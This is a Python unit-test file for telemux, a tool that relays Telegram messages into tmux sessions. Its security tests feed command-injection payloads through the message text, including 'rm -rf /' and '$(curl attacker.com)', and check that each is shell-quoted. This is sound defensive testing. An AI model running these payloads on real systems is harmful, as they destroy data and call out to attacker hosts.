#!/usr/bin/env python3
"""
Unit tests for telemux listener module - session-based routing

Tests the NEW behavior:
- Route messages directly to tmux sessions (no pre-registration)
- Check if tmux session exists
- Show active sessions if target doesn't exist
- Security: sanitize input to prevent command injection
"""

import sys
import unittest
from unittest.mock import patch, MagicMock, Mock, call
from pathlib import Path

# Add parent directory to path to import telemux
sys.path.insert(0, str(Path(__file__).parent.parent))

import telemux


class TestParseMessageId(unittest.TestCase):
    """Test message parsing (session-name: message format)"""

    def test_parse_valid_session_message(self):
        """Parse valid 'session-name: message' format"""
        result = telemux.parse_message_id("claude-session: hello world")
        self.assertEqual(result, ("claude-session", "hello world", False))

    def test_parse_session_with_dashes(self):
        """Parse session name with dashes"""
        result = telemux.parse_message_id("team-mux-setup: test message")
        self.assertEqual(result, ("team-mux-setup", "test message", False))

    def test_parse_session_with_underscores(self):
        """Parse session name with underscores"""
        result = telemux.parse_message_id("test_session: message")
        self.assertEqual(result, ("test_session", "message", False))

    def test_parse_message_with_colons(self):
        """Parse message that contains colons"""
        result = telemux.parse_message_id("session: message with: colons")
        self.assertEqual(result, ("session", "message with: colons", False))

    def test_parse_message_with_extra_spaces(self):
        """Parse message with extra spaces after colon"""
        result = telemux.parse_message_id("session:    message")
        self.assertEqual(result, ("session", "message", False))

    def test_parse_implicit_session_no_colon(self):
        """Parse message without colon (implicit session)"""
        result = telemux.parse_message_id("just a message")
        self.assertEqual(result, (None, "just a message", False))

    def test_parse_bypass_mode_explicit(self):
        """Parse bypass mode with explicit session"""
        result = telemux.parse_message_id("session: !dangerous command")
        self.assertEqual(result, ("session", "dangerous command", True))

    def test_parse_bypass_mode_implicit(self):
        """Parse bypass mode with implicit session"""
        result = telemux.parse_message_id("!ls -la")
        self.assertEqual(result, (None, "ls -la", True))


class TestNewRoutingLogic(unittest.TestCase):
    """Test NEW session-based routing (no pre-registration required)"""

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    @patch('telemux.time.sleep')
    def test_route_to_existing_session(self, mock_sleep, mock_send_tg, mock_subprocess):
        """Route message to existing tmux session"""
        # Mock tmux list-sessions output
        mock_list_result = Mock()
        mock_list_result.returncode = 0
        mock_list_result.stdout = "claude-session\ntest-session\ntelemux\n"

        mock_send_result = Mock()
        mock_send_result.returncode = 0
        mock_send_result.stdout = ""
        mock_send_result.stderr = ""

        def subprocess_side_effect(cmd, **kwargs):
            if 'list-sessions' in cmd:
                return mock_list_result
            else:
                return mock_send_result

        mock_subprocess.side_effect = subprocess_side_effect

        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "text": "claude-session: test message",
                "from": {"first_name": "Marco", "id": 123},
                "chat": {"id": "456"}
            }
        }

        # Call process_update with new routing logic
        telemux.process_update(update, "test-token", "456", None, state)

        # Verify tmux send-keys was called
        calls = [str(call) for call in mock_subprocess.call_args_list]

        # Should call tmux send-keys with the message
        self.assertTrue(any('send-keys' in str(call) for call in calls))

        # Should send confirmation to Telegram
        mock_send_tg.assert_called()
        confirmation = str(mock_send_tg.call_args)
        self.assertIn("delivered", confirmation.lower())

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    def test_route_to_nonexistent_session(self, mock_send_tg, mock_subprocess):
        """Show active sessions when target doesn't exist"""
        # Mock tmux list-sessions output (target session not in list)
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "claude-session\ntest-session\ntelemux\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "text": "nonexistent-session: test message",
                "from": {"first_name": "Marco", "id": 123},
                "chat": {"id": "456"}
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        # Should send error message with session count (not names for security)
        mock_send_tg.assert_called()
        error_msg = str(mock_send_tg.call_args)
        self.assertIn("not found", error_msg.lower())
        # Security fix: Shows count only, not all session names
        self.assertIn("3 active session", error_msg)

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    def test_route_when_no_tmux_sessions(self, mock_send_tg, mock_subprocess):
        """Handle case when no tmux sessions are running"""
        # Mock tmux list-sessions failure (no sessions)
        mock_result = Mock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "text": "any-session: test message",
                "from": {"first_name": "Marco", "id": 123},
                "chat": {"id": "456"}
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        # Should send error about no sessions
        mock_send_tg.assert_called()
        error_msg = str(mock_send_tg.call_args)
        self.assertIn("no tmux sessions", error_msg.lower())

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    @patch('telemux.time.sleep')
    def test_message_delivery_includes_sleep(self, mock_sleep, mock_send_tg, mock_subprocess):
        """Verify 1-second sleep before Enter (critical for tmux buffering)"""
        # Mock tmux list-sessions
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test-session\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "text": "test-session: hello",
                "from": {"first_name": "Marco", "id": 123},
                "chat": {"id": "456"}
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        # Should call sleep(1) before sending Enter
        mock_sleep.assert_called_with(1)

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    @patch('telemux.time.sleep')
    def test_implicit_session_uses_last_active(self, mock_sleep, mock_send_tg, mock_subprocess):
        """Verify implicit session uses last_active_session"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "my-session\n"
        mock_subprocess.return_value = mock_result

        # Set a last active session
        state = {"last_update_id": 0, "last_active_session": "my-session"}
        update = {
            "message": {
                "text": "hello without session prefix",
                "from": {"first_name": "Marco", "id": 123},
                "chat": {"id": "456"}
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        # Should still route to my-session
        mock_send_tg.assert_called()
        confirmation = str(mock_send_tg.call_args)
        self.assertIn("my-session", confirmation)

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    def test_implicit_session_no_last_active(self, mock_send_tg, mock_subprocess):
        """Verify implicit session without last_active_session sends error"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "my-session\n"
        mock_subprocess.return_value = mock_result

        # No last active session
        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "text": "hello without session prefix",
                "from": {"first_name": "Marco", "id": 123},
                "chat": {"id": "456"}
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        # Should send error about no active session
        mock_send_tg.assert_called()
        error_msg = str(mock_send_tg.call_args)
        self.assertIn("No active session", error_msg)


class TestSecurity(unittest.TestCase):
    """Test security features - command injection prevention"""

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    @patch('telemux.time.sleep')
    def test_command_injection_backticks(self, mock_sleep, mock_send_tg, mock_subprocess):
        """Prevent command injection via backticks"""
        # Mock tmux list-sessions
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test-session\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}

        # Attempt command injection with backticks
        update = {
            "message": {
                "text": "test-session: `rm -rf /`",
                "from": {"first_name": "Attacker", "id": 123},
                "chat": {"id": "456"}
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        # Verify the message was quoted/escaped
        calls = mock_subprocess.call_args_list
        send_keys_calls = [c for c in calls if 'send-keys' in str(c)]

        # Should have called send-keys
        self.assertTrue(len(send_keys_calls) > 0, "send-keys should be called")

        # The message should be escaped (shlex.quote wraps in single quotes)
        message_arg = str(send_keys_calls[0])
        # After shlex.quote, the backticks should be safely quoted
        self.assertIn("'`rm -rf /`'", message_arg, "Backticks should be quoted")

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    @patch('telemux.time.sleep')
    def test_command_injection_dollar_paren(self, mock_sleep, mock_send_tg, mock_subprocess):
        """Prevent command injection via $(command)"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test-session\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}

        # Attempt command injection with $()
        update = {
            "message": {
                "text": "test-session: $(curl attacker.com)",
                "from": {"first_name": "Attacker", "id": 123},
                "chat": {"id": "456"}
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        calls = mock_subprocess.call_args_list
        send_keys_calls = [c for c in calls if 'send-keys' in str(c)]

        self.assertTrue(len(send_keys_calls) > 0)
        message_arg = str(send_keys_calls[0])
        # After shlex.quote, the $() should be safely quoted
        self.assertIn("'$(curl attacker.com)'", message_arg, "$() should be quoted")

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    @patch('telemux.time.sleep')
    def test_command_injection_semicolon(self, mock_sleep, mock_send_tg, mock_subprocess):
        """Prevent command injection via semicolon"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test-session\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}

        # Attempt command injection with semicolon
        update = {
            "message": {
                "text": "test-session: hello; rm -rf /",
                "from": {"first_name": "Attacker", "id": 123},
                "chat": {"id": "456"}
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        calls = mock_subprocess.call_args_list
        send_keys_calls = [c for c in calls if 'send-keys' in str(c)]

        self.assertTrue(len(send_keys_calls) > 0)
        message_arg = str(send_keys_calls[0])
        # After shlex.quote, the semicolon should be safely quoted
        self.assertIn("'hello; rm -rf /'", message_arg, "Semicolon should be quoted")

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    @patch('telemux.time.sleep')
    def test_command_injection_ampersand(self, mock_sleep, mock_send_tg, mock_subprocess):
        """Prevent command injection via && operator"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test-session\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}

        # Attempt command injection with &&
        update = {
            "message": {
                "text": "test-session: hello && malicious_command",
                "from": {"first_name": "Attacker", "id": 123},
                "chat": {"id": "456"}
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        calls = mock_subprocess.call_args_list
        send_keys_calls = [c for c in calls if 'send-keys' in str(c)]

        self.assertTrue(len(send_keys_calls) > 0)
        message_arg = str(send_keys_calls[0])
        # After shlex.quote, the && should be safely quoted
        self.assertIn("'hello && malicious_command'", message_arg, "&& should be quoted")

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    def test_unauthorized_chat_id(self, mock_send_tg, mock_subprocess):
        """Test that messages from unauthorized chat IDs are rejected"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test-session\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "text": "test-session: hello",
                "from": {"first_name": "Attacker", "id": 999},
                "chat": {"id": "WRONG_CHAT_ID"}  # Wrong chat ID
            }
        }

        telemux.process_update(update, "test-token", "456", None, state)

        # Should not send to tmux, should log warning
        # Actually it should just return early
        self.assertEqual(mock_subprocess.call_count, 0)

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    def test_unauthorized_user_id(self, mock_send_tg, mock_subprocess):
        """Test that messages from unauthorized user IDs are rejected"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test-session\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "text": "test-session: hello",
                "from": {"first_name": "Attacker", "id": "WRONG_USER_ID"},
                "chat": {"id": "456"}
            }
        }

        # user_id validation enabled
        telemux.process_update(update, "test-token", "456", "123", state)

        # Should not send to tmux
        self.assertEqual(mock_subprocess.call_count, 0)


class TestEdgeCases(unittest.TestCase):
    """Test edge cases and error handling"""

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    def test_empty_message_text(self, mock_send_tg, mock_subprocess):
        """Handle empty message text"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test-session\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "text": "",
                "from": {"first_name": "Marco", "id": 123},
                "chat": {"id": "456"}
            }
        }

        # Should not crash, should log and ignore
        try:
            telemux.process_update(update, "test-token", "456", None, state)
        except Exception as e:
            self.fail(f"Should handle empty message gracefully: {e}")

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    def test_missing_text_field(self, mock_send_tg, mock_subprocess):
        """Handle message without text field"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "test-session\n"
        mock_subprocess.return_value = mock_result

        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "from": {"first_name": "Marco", "id": 123},
                "chat": {"id": "456"}
            }
        }

        # Should not crash
        try:
            telemux.process_update(update, "test-token", "456", None, state)
        except Exception as e:
            self.fail(f"Should handle missing text field: {e}")

    @patch('telemux.subprocess.run')
    @patch('telemux.send_telegram_message')
    def test_tmux_command_failure(self, mock_send_tg, mock_subprocess):
        """Handle tmux command failures gracefully"""
        # Mock tmux send-keys failure
        mock_subprocess.side_effect = Exception("tmux error")

        state = {"last_update_id": 0, "last_active_session": None}
        update = {
            "message": {
                "text": "test-session: message",
                "from": {"first_name": "Marco", "id": 123},
                "chat": {"id": "456"}
            }
        }

        # Should catch exception and send error to Telegram
        telemux.process_update(update, "test-token", "456", None, state)

        # Should send error notification
        mock_send_tg.assert_called()
        error_msg = str(mock_send_tg.call_args)
        self.assertIn("error", error_msg.lower())


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)
